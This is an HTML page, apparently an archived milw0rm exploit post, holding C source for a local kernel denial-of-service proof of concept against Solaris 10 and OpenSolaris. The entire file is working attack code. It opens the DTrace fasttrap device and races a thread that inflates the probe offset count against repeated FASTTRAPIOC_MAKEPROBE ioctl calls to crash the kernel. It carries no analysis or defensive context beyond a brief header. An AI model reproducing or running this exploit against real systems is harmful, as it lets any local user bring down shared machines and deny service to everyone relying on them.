<html><head><title>Solaris 10 / OpenSolaris (fasttrap) Local Kernel Denial of Service PoC</title></head><pre>/* solaris-fasttrap-dos.c
 *
 * Copyright (c) 2008 by &lt;mu-b@digit-labs.org&gt;
 *
 * Solaris &gt;= 10/Opensolaris local kernel DoS POC
 * by mu-b - Wed 19 Nov 2008
 *
 * - Tested on:  Sun Solaris 10 (SPARC)
 *               Sun OpenSolaris &lt;= snv_113 (x86)
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;fcntl.h&gt;
#include &lt;pthread.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/fasttrap.h&gt;
#include &lt;unistd.h&gt;

#define DTRACE_FASTTRAP &quot;/devices/pseudo/fasttrap@0:fasttrap&quot;

void *
hammer (void *addr)
{
  fasttrap_probe_spec_t *probe;
  probe = addr;

  while (1)
    {
      probe-&gt;ftps_noffs = 1024 * 128;
      usleep (10);
    }

  return (NULL);
}

int
main (int argc, char **argv)
{
  fasttrap_probe_spec_t probe;
  int i, fd, n, tid;

  printf (&quot;Solaris &gt;= 10/Opensolaris local kernel DoS PoC\n&quot;
          &quot;by: &lt;mu-b@digit-labs.org&gt;\n&quot;
          &quot;http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n&quot;);

  fd = open (DTRACE_FASTTRAP, O_RDONLY);
  if (fd &lt; 0)
    {
      fprintf (stderr, &quot;failed opening %s\n&quot;, DTRACE_FASTTRAP);
      return (EXIT_FAILURE);
    }

  memset (&amp;probe, 0, sizeof probe);
  memset (&amp;probe.ftps_func, 0x41, DTRACE_FUNCNAMELEN-1);
  memset (&amp;probe.ftps_mod, 0x41, DTRACE_MODNAMELEN-1);

  probe.ftps_type = DTFTP_OFFSETS;
  probe.ftps_pid = getpid ();

  n = pthread_create (&amp;tid, NULL, hammer, &amp;probe);
  if (n &lt; 0)
    {
      fprintf (stderr, &quot;failed creating hammer thread\n&quot;);
      return (EXIT_FAILURE);
    }

  for (i = 0; ; i++)
    {
      probe.ftps_noffs = 1;
      n = ioctl (fd, FASTTRAPIOC_MAKEPROBE, &amp;probe);

      if (!(i % 64))
        printf (&quot;tried: %d-times\r&quot;, i);
    }

  return (EXIT_SUCCESS);
}

// milw0rm.com [2009-05-04]</pre></html>